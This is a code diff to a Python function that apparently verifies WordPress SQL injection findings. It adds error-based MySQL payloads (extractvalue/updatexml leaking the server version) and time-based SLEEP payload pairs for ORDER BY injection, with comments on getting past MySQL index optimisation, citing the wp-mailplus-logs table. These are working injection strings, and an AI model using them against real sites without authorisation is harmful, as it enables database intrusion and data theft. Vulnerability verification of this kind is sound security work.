@@ -5010,6 +5010,13 @@ def verify_wordpress_sqli(
                 f"{_orderby_col_prefix}(SELECT updatexml(1,concat(0x7e,version()),1))",
                 ",(SELECT extractvalue(1,concat(0x7e,version())))",
                 ",(SELECT updatexml(1,concat(0x7e,version()),1))",
+                # Pure-subquery style: MySQL cannot use an index scan when the entire ORDER BY
+                # is a subquery expression (no column reference), so the expression IS evaluated
+                # even on a table with an indexed 'sent_time' column where the col-prefix style
+                # above is silently skipped by the MySQL optimizer.  Critical for tables where
+                # the PoC appends to an indexed column (e.g. wp-mailplus-logs: sent_time index).
+                "(SELECT extractvalue(1,concat(0x7e,version())))",
+                "(SELECT updatexml(1,concat(0x7e,version()),1))",
             ]
             orderby_error_tried = []
             orderby_error_found = None
@@ -5079,6 +5086,12 @@ def verify_wordpress_sqli(
                     (",(SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)",
                      ",(SELECT CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)"),
                     (",(SELECT SLEEP(5))", ",(SELECT SLEEP(0))"),
+                    # Pure-subquery style: ORDER BY (SELECT SLEEP(5)) — no column prefix so MySQL
+                    # cannot use an index scan on the existing column and MUST evaluate the
+                    # expression.  Needed when the prefix column (e.g. sent_time) has an index
+                    # and MySQL's optimizer would otherwise skip the second ORDER BY item.
+                    ("(SELECT IF(1=1,SLEEP(5),0))", "(SELECT IF(1=2,SLEEP(5),0))"),
+                    ("(SELECT SLEEP(5))", "(SELECT SLEEP(0))"),
                 ]
                 for slow_p, fast_p in orderby_timing_pairs:
                     try:
